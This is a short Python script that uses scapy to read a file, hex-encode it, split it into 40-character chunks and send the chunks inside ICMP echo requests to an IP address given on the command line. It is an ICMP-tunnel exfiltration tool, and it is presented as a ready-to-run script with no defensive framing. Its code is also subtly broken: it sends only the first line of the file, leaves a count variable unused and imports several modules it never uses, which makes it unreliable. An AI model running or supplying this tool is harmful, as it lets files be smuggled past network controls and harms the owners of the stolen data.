
from scapy.all import *

from tqdm import tqdm

import signal

import subprocess

import sys

import time

import re

import ipaddress

import argparse

from multiprocessing import Process

import netifaces

 

parser = argparse.ArgumentParser()

parser.add_argument('-i', '--ip', type=str, required=True, help="IP Address to Send Information")

parser.add_argument('-f', '--file', required=True,

                            type=str,

                            dest='file',

                            help='File name to save data or to send.',

                            )

args = parser.parse_args()

 

def run_checks(ip):

    #check IP address

    try:

        ipaddress.ip_address(ip)

    except:

        print("Invalid IP Address")

        exit()

 

def split_data(data):

    char = '*'

    padding = 40-(len(data) % 40)

    pad_len = len(data)+padding

    padded = f"{data:{char}<{pad_len}}"

    return ' '.join(padded[i: i+40] for i in range(0, len(padded), 40))

def send_info(ip, file_name):

    encodedFile = []

    split_encodedFile = []

    file = open(file_name, 'rb').readlines()

    for fileData in file:

        encodedFile.append(fileData.decode().encode().hex())

    cnt = len(encodedFile) - 10

    split_encodedFile = split_data(encodedFile[0]).split(' ')

    for encodedData in split_encodedFile:

        payload = (IP(dst=ip, ttl=128) / ICMP(type=8, id=12312) / Raw(load=encodedData))

        sr(payload, timeout=0, verbose=0)

 

if __name__ == "__main__":

    run_checks(args.ip)

    send_info(args.ip, args.file)
